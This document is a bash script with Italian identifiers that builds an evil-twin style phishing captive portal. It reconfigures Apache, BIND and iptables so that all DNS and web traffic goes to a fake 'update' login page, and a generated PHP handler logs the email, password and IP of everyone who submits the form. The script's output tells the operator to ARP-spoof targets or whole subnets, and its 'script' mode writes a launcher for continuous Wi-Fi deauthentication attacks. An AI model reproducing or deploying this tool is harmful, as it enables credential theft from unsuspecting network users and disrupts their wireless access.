#!/bin/bash
# SCRIPT DEPENDENCIES:		iptables psmisc net-tools aircrack-ng bind9 hostapd isc-dhcp-server
# WEB DEPENDENCIES:			apache2 php5 libapache2-mod-php5 

# apt install iptables psmisc net-tools aircrack-ng bind9 hostapd isc-dhcp-server apache2 php5 libapache2-mod-php5
# ./captive_portal.sh -i wlan0 -c 1 -s TEST -m et_aggiornamento/_generic start 

# TODO:	Semplificare l'operazione

#Generali
interfaccia=wlan0
sleep_time=1

#Modulo Web
modulo_web="et_aggiornamento/_generic"

#Network
default_gateway="127.0.0.1"
local_address="127.0.0.1"
fake_dns_resp="8.8.8.8"
main_page="auth.html"
land_page="updating.html"

###########################################################

if [ "$(id -u)" != "0" ]; then
   echo "[!] This script must be run as root."
   exit 1
fi

###########################################################

function fx_check_dependencies {

	missing=""
	dep=('iptables' 'php' 'psmisc' 'net-tools' 'bind9' 'apache2') #php5 libapache2-mod-php5)

	t=$(/usr/bin/dpkg -s aircrack-ng &> /dev/null; echo $?)


	for (( j=0; j<${#dep[@]}; j++ )); do
		t=$(/usr/bin/dpkg -s ${dep[j]} &> /dev/null; echo $?)
		if [ "$t" -ne 0 ]; then
			echo -e "[!] ${dep[j]} Not installed"
			missing="$missing ${dep[j]}"
		else
			echo -e "[*] ${dep[j]} Installed"

		fi

	done


	if [ ! -z "$missing" ]; then
		echo
		echo "[!] Missing dependencies, please do:"; echo
		echo "    apt-get update; apt-get install $missing -y"
		exit 1
	fi
	

}

###########################################################

function fx_reset_network {
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT
	iptables -P FORWARD ACCEPT
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
}

###########################################################

function fx_backup_config {

	if [ -d "backup/" ]; then
		echo "[!] Error, you have to restore a pending backup, try:"
		echo "    ./arp_captive_portal.sh stop"
		exit 1
	
	else

		mkdir backup/
		
		cp /etc/apache2/sites-available/000-default.conf backup/
		cp /etc/apache2/sites-available/default-ssl.conf backup/
		cp /etc/apache2/ports.conf backup/

		cp /etc/bind/named.conf backup/

		iptables-save > backup/iptables_config.txt

		chmod 000 backup/

	fi

}


function fx_restore_config {

	if [ -d "backup/" ]; then

		chmod 755 backup/

		rm -f /etc/apache2/sites-available/000-default.conf
		cp backup/000-default.conf /etc/apache2/sites-available/000-default.conf
		rm -f /etc/apache2/sites-enabled/000-default.conf
		ln -s /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-enabled/
		
		rm -f /etc/apache2/sites-available/default-ssl.conf
		cp backup/default-ssl.conf /etc/apache2/sites-available/default-ssl.conf
		rm -f /etc/apache2/sites-enabled/default-ssl.conf
		ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/

		cp backup/ports.conf /etc/apache2/ports.conf

		cp backup/named.conf /etc/bind/named.conf
		rm -rf /etc/namedb/

		iptables-restore < backup/iptables_config.txt

		cat /var/www/captive_portal/users.txt >> database.txt
		rm -rf /var/www/captive_portal
		rm -rf backup/
		rm -rf /etc/apache2/captive_portal_ssl

	else

		echo "[!] NO BACKUP FOLDER AVAILABLE, backup may have been lost."
		echo "    Check the problem manually."

	fi

}


function fx_captive_start {
###########################################################

#old_data=$(cat /var/www/captive_portal/users.txt)
#fx_reset_network
fx_backup_config

mkdir running/

###########################################################

a2enmod ssl 								# SSL config
mkdir /etc/apache2/captive_portal_ssl 		# SSL config

# SSL config

if [ -f "/etc/apache2/captive_portal_ssl/apache.pem" ] || [ -f "/etc/apache2/captive_portal_ssl/apache.key" ]; then
	echo "[*] Using existent ssl certificates"
else
	echo "[*] Ssl certificates not found, creating it..."
	rm -f /etc/apache2/captive_portal_ssl/apache.pem
	rm -f /etc/apache2/captive_portal_ssl/apache.key
	openssl req -new -x509 -days 365 -nodes -out /etc/apache2/captive_portal_ssl/apache.pem -keyout /etc/apache2/captive_portal_ssl/apache.key -subj "/C=NL/ST=user/L=Rotterdam/O=Network/OU=IT Department/CN=ssl.net.org"
fi


(echo '<VirtualHost *:8000>
	ServerAdmin *

	DocumentRoot /var/www/captive_portal
	
	ErrorDocument 404 /index.php
	ErrorDocument 500 /index.php
	ErrorDocument 503 /index.php

	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory /var/www/captive_portal>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>

	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	<Directory "/usr/lib/cgi-bin">
		AllowOverride None
		Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
		Order allow,deny
		Allow from all
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log

	# Possible values include: debug, info, notice, warn, error, crit,
	# alert, emerg.
	LogLevel warn

	CustomLog ${APACHE_LOG_DIR}/access.log combined

	Alias /doc/ "/usr/share/doc/"
	<Directory "/usr/share/doc/">
		Options Indexes MultiViews FollowSymLinks
		AllowOverride None
		Order deny,allow
		Deny from all
		Allow from 127.0.0.0/255.0.0.0 ::1/128
	</Directory>

</VirtualHost>') > /etc/apache2/sites-available/000-default.conf



(echo '<IfModule mod_ssl.c>
	<VirtualHost *:443>
		ServerAdmin *
		DocumentRoot /var/www/captive_portal

		ErrorDocument 404 /index.php
		ErrorDocument 500 /index.php
		ErrorDocument 503 /index.php
		
		ErrorLog ${APACHE_LOG_DIR}/error.log
		CustomLog ${APACHE_LOG_DIR}/access.log combined

		SSLEngine on

		SSLCertificateFile	/etc/apache2/captive_portal_ssl/apache.pem
		SSLCertificateKeyFile /etc/apache2/captive_portal_ssl/apache.key

		
		<FilesMatch "\.(cgi|shtml|phtml|php)$">
				SSLOptions +StdEnvVars
		</FilesMatch>
		<Directory /usr/lib/cgi-bin>
				SSLOptions +StdEnvVars
		</Directory>
		

	</VirtualHost>
</IfModule>') > /etc/apache2/sites-available/default-ssl.conf 		# SSL config



(echo '# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 8000

<IfModule ssl_module>
	Listen 443
</IfModule>

#<IfModule mod_ssl.c>
#    # If you add NameVirtualHost *:443 here, you will also have to change
#    # the VirtualHost statement in /etc/apache2/sites-available/default-ssl
#    # to <VirtualHost *:443>
#    # Server Name Indication for SSL named virtual hosts is currently not
#    # supported by MSIE on Windows XP.
#    NameVirtualHost *:443
#    Listen 443
#</IfModule>

#<IfModule mod_gnutls.c>
#    Listen 443
#</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet') > /etc/apache2/ports.conf


rm -f /etc/apache2/sites-enabled/000-default.conf
ln -s /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-enabled/

rm -f /etc/apache2/sites-enabled/default-ssl.conf
ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/

rm -rf /var/www/captive_portal
mkdir /var/www/captive_portal
cp -r ap_module/$modulo_web/* /var/www/captive_portal/
cp -r ap_module/_bootstrap/* /var/www/captive_portal/


(echo "<?php
http_response_code(302);
header(\"Location:http://$local_address/$main_page\");
exit();
?>") > /var/www/captive_portal/index.php


(echo "<?php
\$a = \$_REQUEST[\"email\"];
\$b = \$_REQUEST[\"pass\"];
\$c = date(\"H:i:s\");

//the data
\$data = \"\r\n\$c  |  \" . get_client_ip() . \"  |  \$a  |  \$b  \";

//open the file and choose the mode
\$fh = fopen(\"users.txt\", \"a\");
fwrite(\$fh, \$data);

//close the file
fclose(\$fh);

header(\"location:$land_page\");

function get_client_ip() {
    \$ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        \$ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        \$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        \$ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        \$ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       \$ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        \$ipaddress = getenv('REMOTE_ADDR');
    else
        \$ipaddress = 'UNKNOWN';
    return \$ipaddress;
}
?>")  > /var/www/captive_portal/login.php

touch /var/www/captive_portal/users.txt
chmod 777 /var/www/captive_portal/* -R
chmod 666 /var/www/captive_portal/users.txt

a2ensite default-ssl				# SSL config
service apache2 reload				# SSL config

/etc/init.d/apache2 stop
/etc/init.d/apache2 start
#/etc/init.d/apache2 restart

###########################################################

(echo 'options {
	directory	"/etc/namedb";
	pid-file	"/var/run/named/pid";
	allow-query	{ any; };
	allow-recursion	{ any; };
};


zone "." {
	type master;
	file "/etc/namedb/db.catchall";
};') > /etc/bind/named.conf

#---------------------------------------------------------#

rm -rf /etc/namedb/
mkdir -p /etc/namedb/

(echo "$""TTL    604800
@       IN      SOA     . root.localhost. (
							  1         ; Serial
						 604800         ; Refresh
						  86400         ; Retry
						2419200         ; Expire
						 604800 )       ; Negative Cache TTL

	IN	NS	.
.	IN	A	$fake_dns_resp
*.	IN	A	$fake_dns_resp") > /etc/namedb/db.catchall

/etc/init.d/bind9 stop
/etc/init.d/bind9 start
#/etc/init.d/bind9 restart

###########################################################

(echo "
import socket
import time
import os
import sys
import thread
from threading import Thread

def responder(conn, addr, response):
	request = conn.recv(1024*32)
	#print addr
	#print request

	print '[*] Responding at: ' + str(addr)

	conn.sendall(response)
	conn.close()


captive = '''\
HTTP/1.0 302 Redirect
Server: OpenRG
Content-Type: text/html
Location: http://$local_address:8000/$main_page
Connection: close

<!DOCTYPE html>
<html>
	<br>
</html>
'''

cp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
cp.bind(('0.0.0.0', 80))
cp.listen(1)
print '[*] Captive portal hosted'

while True:
	try:
		conn, addr = cp.accept()
		thread.start_new_thread ( responder, (conn, addr, captive))
	except:
		print '[!] Error while responding...'

") > running/captive_responder.py

#xterm -e "running/python captive_responder.py" &
python running/captive_responder.py > /dev/null &
echo "$!" > "/tmp/captive_responder_pid"

###########################################################

iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 80 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 443 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 8000 -j ACCEPT
iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --dport 8000 -j ACCEPT

iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 8000 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --sport 443 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --sport 8000 -j ACCEPT

iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $local_address:53
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $local_address:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $local_address:443
iptables -t nat -A PREROUTING -p tcp --dport 8000 -j DNAT --to-destination $local_address:8000

# Only for rpi-ssh
iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

iptables -A INPUT -i $interfaccia -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o $interfaccia -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

###########################################################
echo
echo "###########################################################"
echo "#                      Started                            #"
echo "###########################################################"
echo
echo "[*] Now arpspoof your target/s by using: "
echo "    arpspoof -i $interfaccia -r $default_gateway -t <target>"
echo
echo "[*] Or arpspoof the whole subnet by using: "
echo "    arpspoof -i $interfaccia $default_gateway"
echo
echo
} # END OF CAPTIVE START
###########################################################

function fx_captive_stop {
	new_data=$(cat /var/www/captive_portal/users.txt)

	fx_reset_network
	fx_restore_config

	/etc/init.d/apache2 stop
	/etc/init.d/bind9 stop

	pid=$(cat /tmp/captive_responder_pid)
	echo $pid
	kill $pid
	rm -f /tmp/captive_responder_pid
	rm -rf running/

	echo
	echo "###########################################################"
	echo "#  Showing data gathered with the script...               #"
	echo "###########################################################"
	echo

	echo $new_data

###########################################################
} # END OF CAPTIVE STOP


#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#

function fx_usage { 
	echo "Usage: $0 [Options] [Mode]"
	echo
	echo "OPTIONS:"
	echo "  -i       interface"
	echo "  -m       module"
	echo
	echo "MODES:"
	echo "  list     list all modules available"
	echo "  start    start the captive_portal"
	echo "  stop     stop the captive_portal"
	echo "  check    check users.txt file"
	echo "  script   generate a script"
	echo "  restore  restore the precedent backup"
	echo 
	echo "EXAMPLE: "
	echo "   ./arp_captive_portal.sh -i wlan0 -m et_aggiornamento/_generic start"
	echo 
	exit 1
}


while getopts ":i:m:h:" x; do
	case "${x}" in
		i)
			i=${OPTARG}
			;;
		m)
			m=${OPTARG}
			;;
		*)
			#fx_usage
			;;
	esac
done
shift $((OPTIND-1))

if [ -z "$1" ]; then
	echo "[!] MODE REQUIRED"; echo
	fx_usage
	exit 1
fi

###########################################################

if [ "$1" == "list" ]; then

	echo
	echo "[*] Available modules: "
	echo
	find ap_module/ -maxdepth 2 -type d -not -path "*_bootstrap*" -not -path "ap_module/" -print | cut -d"/" -f 2-
	echo
	echo
	
fi

###########################################################

if [ "$1" == "start" ]; then

	if [ -f "/tmp/captive_responder_pid" ] || [ -f "running/" ]; then
		echo "[!] Script already running, try: "
		echo "    ./arp_captive_portal.sh stop"
		exit -1

	elif [ -z "${i}" ] || [ -z "${m}" ]; then
		echo "[!] i, m, need to be set"; echo
		fx_usage
		exit 1
	
	
	elif [[ ! -d "/sys/class/net/${i}" ]]; then
		echo "[!] INTERFACE: ${i} Not found or not up."; echo
		exit 1


	elif [ ! -d "ap_module/${m}" ]; then
		echo "[!] MODULE ${m} NOT FOUND."; echo
		exit 1

	else

		fx_check_dependencies

		interfaccia=${i}
		default_gateway=$(ip route show | grep 'default' | cut -d" " -f3)
		local_address=$(ifconfig $interfaccia | grep 'inet' | cut -d: -f2 | awk '{ print $2}')
		sleep_time=1
		modulo_web=${m}

		echo
		echo "Default_Gateway:  $default_gateway"
		echo "Local_Address:    $local_address"
		echo "Interfaccia:      $interfaccia"
		echo "Modulo_Web:       $modulo_web"
		echo


		fx_reset_network
		fx_captive_start

	fi

fi

###########################################################

if [ "$1" == "stop" ]; then
	if [ ! -f "/tmp/captive_responder_pid" ]; then
		res=1
	else 
		res=0
	fi

	fx_captive_stop
	
	if [ "$res" == "1" ]; then

		echo
		echo "###########################################################"
		echo "# Stopped, but no pid found for captive_portal.py         #"
		echo "###########################################################"
	else
		echo
		echo "###########################################################"
		echo "#                      Stopped                            #"
		echo "###########################################################"
	fi
fi

###########################################################

if [ "$1" == "check" ]; then
	if [ -f "/tmp/captive_responder_pid" ]; then
		cont=0
		while true
			do
			cont=$((cont + 1))
			clear
			echo "Time ($cont sec.)"
			echo "-------------------------"
			echo "Data:"
			cat /var/www/captive_portal/users.txt 
			echo
			echo "-------------------------"
			echo "Dhcp:"
			cat /var/lib/dhcp/dhcpd.leases | grep "lease" | cut -d " " -f 2
			echo
			echo "-------------------------"
			echo "(ctrl+c to stop)"
			sleep 1
		done
	else
		echo "[!] Captive Portal not running."
		exit -1
	fi
fi

###########################################################

if [ "$1" == "script" ]; then

printf "[?] Script name: "; read script_name

(echo '#!/bin/bash
interface=""
channel=""
ssid=""
module=""
password=""

interface_24=""		# interface for 2,5ghz target
bssid_24=""			# bssid for 2,5ghz target
channel_24=""		# channel for 2,5ghz target
ssid_24=""	    	# ssid for 2,5ghz target

interface_50=""		# interface for 5ghz target
bssid_50=""			# bssid for 5ghz target
channel_50=""		# channel for 5ghz target
ssid_50=""			# ssid for 5ghz target

########################################################################################
# DO NOT TOUCH FROM HERE
########################################################################################


bash captive_portal.sh -i "$interface" -c "$channel" -s "$ssid" -m "$module" start

if [[ ! -z "$interface_24" ]]; then
	airmon-ng check kill
	airmong-ng stop $interface_24mon
	airmong-ng start $interface_24 $channel_24

	aireplay-ng -0 0 -a "$bssid_24" "$interface_24mon" &> /dev/null &
	echo "[*] Deauth started on $bssid_24 (2,4ghz)"

fi

if [[ ! -z "$interface_50" ]]; then
	airmon-ng check kill
	airmong-ng stop $interface_50mon
	airmong-ng start $interface_50 $channel_50

	aireplay-ng -0 0 -a "$bssid_50" "$interface_50mon" &> /dev/null &
	echo "[*] Deauth started on $bssid_50 (5,0ghz)"

fi

echo "[*] All done."') > $script_name

chmod +x $script_name
echo "[*] Script wrote, check variables before running it."

fi

#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#

exit 0